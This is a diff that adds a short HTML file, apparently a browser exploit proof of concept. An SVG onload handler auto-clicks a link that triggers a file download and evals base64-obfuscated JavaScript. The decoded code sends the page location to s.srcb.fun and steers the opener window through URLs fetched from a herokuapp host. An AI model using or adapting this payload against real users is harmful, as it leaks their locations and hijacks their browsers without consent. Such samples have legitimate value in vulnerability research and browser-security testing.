@@ -1,0 +1,13 @@
+<html>
+<body>
+<!--
+<script>i=document.createElement('img');i.src=`http://s.srcb.fun/${btoa(location)}`</script>
+PHNjcmlwdD5pPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2ltZycpO2kuc3JjPWBodHRwOi8vcy5zcmNiLmZ1bi8ke2J0b2EobG9jYXRpb24pfWA8L3NjcmlwdD4=
+-->
+
+<a href="data:text/html;base64,PHNjcmlwdD5pPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2ltZycpO2kuc3JjPWBodHRwOi8vcy5zcmNiLmZ1bi8ke2J0b2EobG9jYXRpb24pfWA8L3NjcmlwdD4=" download="1.html" id=c onclick="window.open('javascript:eval(atob(`ZnVuY3Rpb24gcmVxTGlzdGVuZXIgKCl7YXJyYXk9dGhpcy5yZXNwb25zZVRleHQuc3BsaXQoIlxuIik7ZGVsZXRlIGFycmF5W2FycmF5Lmxlbmd0aC0xXTtpPXNldEludGVydmFsKCgpPT57YXJyYXkubGVuZ3RoP3dpbmRvdy5vcGVuZXIubG9jYXRpb249YXJyYXkucG9wKCk6Y2xlYXJJbnRlcnZhbChpKX0sNjUwKTt9dmFyIG9SZXE9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7b1JlcS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIixyZXFMaXN0ZW5lcik7b1JlcS5vcGVuKCJHRVQiLCJodHRwczovL3NydmNiLmhlcm9rdWFwcC5jb20vbGlzdCIpO29SZXEuc2VuZCgpOw==`))','_blank');">click</a>
+<svg/onload=c.click()>
+
+
+</body>
+</html>
